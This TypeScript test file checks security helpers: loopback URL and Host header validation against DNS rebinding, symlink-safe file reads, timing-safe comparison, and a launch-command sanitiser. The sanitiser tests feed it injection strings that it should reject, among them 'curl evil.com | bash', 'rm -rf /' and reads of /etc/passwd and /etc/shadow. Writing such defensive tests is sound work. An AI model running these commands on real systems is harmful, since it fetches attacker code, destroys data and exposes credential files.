// security.test.ts — Tests for security utilities and hardening measures.

import { test } from 'bun:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { isLoopbackUrl, isValidHostHeader, readFileSecurely, sanitizeLaunchCommand, timingSafeEqual } from './security';

// ---------------------------------------------------------------------------
// isLoopbackUrl
// ---------------------------------------------------------------------------

test('sec: isLoopbackUrl accepts 127.0.0.1', () => {
  assert.equal(isLoopbackUrl('http://127.0.0.1:8080'), true);
});

test('sec: isLoopbackUrl accepts localhost', () => {
  assert.equal(isLoopbackUrl('http://localhost:3000'), true);
});

test('sec: isLoopbackUrl accepts ::1', () => {
  assert.equal(isLoopbackUrl('http://[::1]:9000'), true);
});

test('sec: isLoopbackUrl rejects external URL', () => {
  assert.equal(isLoopbackUrl('http://attacker.example.com:8080'), false);
});

test('sec: isLoopbackUrl rejects IP that looks local but is not', () => {
  assert.equal(isLoopbackUrl('http://127.0.0.2:8080'), false);
});

test('sec: isLoopbackUrl rejects DNS rebinding candidate', () => {
  assert.equal(isLoopbackUrl('http://evil.127.0.0.1.nip.io:8080'), false);
});

test('sec: isLoopbackUrl returns false for invalid URL', () => {
  assert.equal(isLoopbackUrl('not-a-url'), false);
});

test('sec: isLoopbackUrl returns false for empty string', () => {
  assert.equal(isLoopbackUrl(''), false);
});

// ---------------------------------------------------------------------------
// sanitizeLaunchCommand
// ---------------------------------------------------------------------------

test('sec: sanitizeLaunchCommand accepts safe command', () => {
  assert.equal(sanitizeLaunchCommand('openclaude --project-aware'), 'openclaude --project-aware');
});

test('sec: sanitizeLaunchCommand accepts path with slashes', () => {
  assert.equal(sanitizeLaunchCommand('/usr/local/bin/openclaude'), '/usr/local/bin/openclaude');
});

test('sec: sanitizeLaunchCommand rejects && injection', () => {
  assert.equal(sanitizeLaunchCommand('openclaude && curl evil.com | bash'), null);
});

test('sec: sanitizeLaunchCommand rejects || injection', () => {
  assert.equal(sanitizeLaunchCommand('openclaude || malicious'), null);
});

test('sec: sanitizeLaunchCommand rejects ; injection', () => {
  assert.equal(sanitizeLaunchCommand('openclaude; rm -rf /'), null);
});

test('sec: sanitizeLaunchCommand rejects | pipe', () => {
  assert.equal(sanitizeLaunchCommand('openclaude | tee /tmp/log'), null);
});

test('sec: sanitizeLaunchCommand rejects backtick injection', () => {
  assert.equal(sanitizeLaunchCommand('openclaude `whoami`'), null);
});

test('sec: sanitizeLaunchCommand rejects $() substitution', () => {
  assert.equal(sanitizeLaunchCommand('openclaude $(cat /etc/passwd)'), null);
});

test('sec: sanitizeLaunchCommand rejects > redirect', () => {
  assert.equal(sanitizeLaunchCommand('openclaude > /tmp/stolen'), null);
});

test('sec: sanitizeLaunchCommand rejects < redirect', () => {
  assert.equal(sanitizeLaunchCommand('openclaude < /etc/shadow'), null);
});

test('sec: sanitizeLaunchCommand returns null for empty', () => {
  assert.equal(sanitizeLaunchCommand(''), null);
  assert.equal(sanitizeLaunchCommand('   '), null);
});

// ---------------------------------------------------------------------------
// timingSafeEqual
// ---------------------------------------------------------------------------

test('sec: timingSafeEqual returns true for equal strings', () => {
  assert.equal(timingSafeEqual('oc-lm-abc123', 'oc-lm-abc123'), true);
});

test('sec: timingSafeEqual returns false for different strings', () => {
  assert.equal(timingSafeEqual('oc-lm-abc123', 'oc-lm-xyz789'), false);
});

test('sec: timingSafeEqual returns false for different lengths', () => {
  assert.equal(timingSafeEqual('short', 'much-longer-string'), false);
});

test('sec: timingSafeEqual returns false for empty vs non-empty', () => {
  assert.equal(timingSafeEqual('', 'something'), false);
});

// ---------------------------------------------------------------------------
// readFileSecurely
// ---------------------------------------------------------------------------

test('sec: readFileSecurely reads a normal file', () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-sec-'));
  try {
    const filePath = path.join(tmpDir, 'test.json');
    fs.writeFileSync(filePath, '{"key": "value"}', 'utf8');
    assert.equal(readFileSecurely(filePath), '{"key": "value"}');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('sec: readFileSecurely returns null for missing file', () => {
  assert.equal(readFileSecurely('/tmp/nonexistent-file-xyz'), null);
});

test('sec: readFileSecurely rejects symlinks', () => {
  if (process.platform === 'win32') return; // symlinks require admin on Windows
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'oc-sec-'));
  try {
    const realFile = path.join(tmpDir, 'real.json');
    const symlink = path.join(tmpDir, 'link.json');
    fs.writeFileSync(realFile, '{"secret": true}', 'utf8');
    fs.symlinkSync(realFile, symlink);
    assert.equal(readFileSecurely(symlink), null);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// isValidHostHeader
// ---------------------------------------------------------------------------

test('sec: isValidHostHeader accepts 127.0.0.1', () => {
  assert.equal(isValidHostHeader('127.0.0.1'), true);
});

test('sec: isValidHostHeader accepts 127.0.0.1 with port', () => {
  assert.equal(isValidHostHeader('127.0.0.1:8080'), true);
});

test('sec: isValidHostHeader accepts localhost', () => {
  assert.equal(isValidHostHeader('localhost'), true);
});

test('sec: isValidHostHeader accepts localhost with port', () => {
  assert.equal(isValidHostHeader('localhost:3000'), true);
});

test('sec: isValidHostHeader rejects external hostname', () => {
  assert.equal(isValidHostHeader('evil.example.com'), false);
});

test('sec: isValidHostHeader rejects DNS rebinding hostname', () => {
  assert.equal(isValidHostHeader('evil.127.0.0.1.nip.io'), false);
});

test('sec: isValidHostHeader returns false for undefined', () => {
  assert.equal(isValidHostHeader(undefined), false);
});

test('sec: isValidHostHeader returns false for empty string', () => {
  assert.equal(isValidHostHeader(''), false);
});
